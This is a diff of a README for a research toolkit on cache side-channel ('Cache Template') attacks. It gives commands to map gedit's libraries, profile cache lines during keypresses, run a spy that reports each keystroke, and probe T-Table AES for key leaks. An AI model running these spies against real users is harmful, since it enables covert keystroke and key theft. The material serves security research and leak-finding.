@@ -20,95 +20,49 @@ Use the calibration tool for this purpose:
 ```
 cd calibration
 make
-./calibration
+./calibration 10
 ```
-This program should print a histogram for cache hits and cache misses. Based on the histogram it suggests a suitable threshold value (this value is also returned by the program).
+This program should print a histogram for cache hits and cache misses. The number specifies the bucket size for the histogram.
 
-**Note:** In most programs I defined a constant MIN_CACHE_MISS_CYCLES. Change it based on your threshold, if necessary.
-
-## Getting started: Automated keypress profiling
-It is helpful to start with well observable events like key strokes and an application which is known to process such events (for instance an editor). You find the profiling tools in the profiling folder.
-
-Run the following commands to find keypress information leakage in a program (the program should be running and it should have focus as soon as you started the spy script):
-```
-cd profiling/linux_low_frequency_example
-make
-./spy.sh 5 200 gedit # in our example we profile keypresses in gedit
-```
-The resulting log file is in a format which can be parsed by LibreOffice Calc or similar software.
-You can analyze information leakage through the cache using this log file.
-
-## In detail: Keypresses (with libxdotool)
+## Profiling
 In this example we perform some steps by hand to illustrate what happens in the background.
 Therefore, we will first find the address range to attack.
 ```
-$ cat /proc/`ps -A | grep gedit | grep -oE "^[0-9]+"`/maps | grep r-x | grep gdk-3
-7fc963a05000-7fc963ab4000 r-xp 00000000 fc:01 2637370                    /usr/lib/x86_64-linux-gnu/libgdk-3.so.0.1200.2
+cat /proc/`pidof gedit`/maps | grep libgedit | grep "r-x"
+7fe0674cf000-7fe067511000 r-xp 0001d000 103:04 2768721                   /usr/lib/x86_64-linux-gnu/gedit/libgedit-44.so
 ```
 We do not care about the virtual addresses, but only the size of the address range and the offset in the file (which is 00000000 in this example). This is also the reason why we don't have to think about address space layout randomization.
 
 **Note:** On Windows you can use the tool vmmap to find the same information.
 
-This line can directly be passed to the profiling tool in the following step. We will create a Cache Template in this step. Using the libxdo library. Be sure to install it before trying this.
+This line can directly be passed to the profiling tool in the following step. We will create a Cache Template in this step.
 
-**Note:** There is a second version which runs without libxdo, but then you have to issue the events by some other means.
+During the profiling you need to perform or simulate a huge number of key presses. The profiling tool gives you 2 seconds of time to switch windows, e.g., to an already opened gedit window.
 
-During the profiling we will simulate a huge number of key presses. Therefore, your test system will probably not be usable for a few minutes to hours. Switch to an already opened gedit window before ./spy is started.
 On Linux, run the following lines:
 ```
-cd profiling/linux_low_frequency_example
+cd profiling
 make
-echo "switch to gedit window"
-sleep 5; ./spy 200 7fc963a05000-7fc963ab4000 r-xp 00000000 fc:01 2637370                    /usr/lib/x86_64-linux-gnu/libgdk-3.so.0.1200.2 > libgdk.csv
-```
-On Windows with MSYS/MinGW, run the following lines:
-```
-cd profiling/windows_low_frequency_example
-mingw32-make
-echo "switch to notepad window"
-sleep 5; ./spy 200 C:\Windows\System32\notepad.exe > notepad.csv
+./spy 155 100 7fe0674cf000-7fe067511000 r-xp 0001d000 103:04 2768721                   /usr/lib/x86_64-linux-gnu/gedit/libgedit-44.so
 ```
 
-The resulting log file is in a format which can be parsed by LibreOffice Calc or similar software.
-You can analyze information leakage through the cache using this log file.
-
-You are generally looking for events which have single high peaks, like the following:
+Choose a cache line with a nice number of cache hits and pass it to the generic exploitation spy tool:
 ```
-file,  addr,   0,   1,   2,   3,   4,   5,   6,   7,   8,   9,   a,   b,   c,   d,   e,   f,   g,   h,   i,   j,   k,   l,   m,   n,   o,   p,   q,   r,   s,   t,   u,   v,   w,   x,   y,   z
-/usr/lib/x86_64-linux-gnu/libgdk-3.so.0.1200.2, 0x85ec0,=   3/ 110,=   0/ 112,=   0/ 117,=   0/ 122,=   0/ 120,=   1/ 123,=   0/ 125,=   0/ 123,=   1/ 124,=   0/ 124,=   1/ 123,=   0/ 120,=   0/ 122,=   0/ 121,=   0/ 122,=   0/ 123,=   0/ 122,=   0/ 123,=   1/ 123,=   1/ 121,=   0/ 118,=   0/ 123,=   0/ 122,= 126/ 122,=   0/ 122,=   2/ 117,=   0/ 117,=   0/ 119,=   0/ 121,=   0/ 123,=   3/ 118,=  14/ 122,=   0/ 120,=   0/ 122,=   0/ 117,=   4/ 116
-```
-This one had 126 cache hits during 122 key presses of the key N. And almost none when pressing other keys.
-
-To verify our results we will now use the generic exploitation spy tool:
-```
-cd exploitation/generic
+cd exploitation
 make
-./spy /usr/lib/x86_64-linux-gnu/libgdk-3.so.0.1200.2 0x85ec0
+./spy 155 /usr/lib/x86_64-linux-gnu/gedit/libgedit-44.so 0x22980
 ```
-Now this tool prints a message exactly when a user presses N (in any GTK3 window).
+Now this tool prints a message exactly when a user presses a key (in gedit).
 This spy tool can also be used on Windows just like that.
 
-## In detail: Keypresses (without libxdotool)
-Without libxdotool we can use the generic low frequency profiling tool.
-This tool requires you to generate the events somehow. Depending on what you want to profile this can be another program simulating key strokes, a jammed key, a program which constantly triggers the event to exploit (an encryption...).
-In our case we will just jam a key and create a Cache Template showing which addresses react on key strokes. To filter false positive cache hits we should then perform a second profiling scan without jamming a key.
-
-**Note:** Cache Template Attacks can be fully automated, but this requires the event to be automated as well. In the previous example we used libxdotool for this purpose.
-
-On Windows or OSX you might not have procfs to retrieve the shared library mappings.
-However, on Windows there is vmmap which gives you the same information and on OSX you can use at least ldd and scan the binary itself. Therefore, we execute the generic example tool similar as before:
-```
-cd profiling/generic_low_frequency_example
-make
-sleep 5; ./spy 200 7fc963a05000-7fc963ab4000 r-xp 00000000 fc:01 2637370                    /usr/lib/x86_64-linux-gnu/libgdk-3.so.0.1200.2 > libgdk.csv
-```
+**Note:** Cache Template Attacks can be fully automated, but this requires the event to be automated as well.
 
 ## OpenSSL AES T-Table attack
 This example requires a self-compiled OpenSSL library to enable it's T-Table-based AES implementation.
 Place libcrypto.so in the same folder and make sure the program actually uses it as a shared library.
 Then run
 ```
-cd profiling/aes_example
+cd profiling_aes_example
 make
 ./spy
 ```
@@ -119,27 +73,5 @@ In the exploitation phase the spy tool has to trigger encryptions itself with an
 
 Of course, we know that OpenSSL does not use a T-Table-based AES implementation anymore. But you can use this tool to profile any (possibly closed-source) binary to find whether it contains a crypto algorithm which leaks key dependent information through the cache. Just trigger the algorithm execution with fixed keys 
 
-## Fully automated attack
-In this example we will run a script which will automatically execute the profiling phase as described before and then switch to the multi_spy exploitation tool as soon as a result is available.
-
-Then run
-```
-cd exploitation/multi_spy
-make
-cd ../../profiling/linux_low_frequency_automated
-./spy.sh 5 200 /usr/lib/x86_64-linux-gnu/libgdk-3.so.0.1200.2
-```
-The spy tool should switch into exploitation mode after profiling is completed. The result of the profiling phase is printed on the screen, for instance:
-```
-Events per address:
- 0x85d00:q
- 0x85d40:q
- 0x85d80:ghijklnqtuvwz
- 0x85dc0:iuzn
- 0x85e00:iznuj
- 0x85e40:inzu
- 0x85e80:n
- 0x85ec0:n
-```
 
 That's it, now it's up to you to find out which of your software leaks data and how it could be exploited. I hope it helps you closing these leaks.
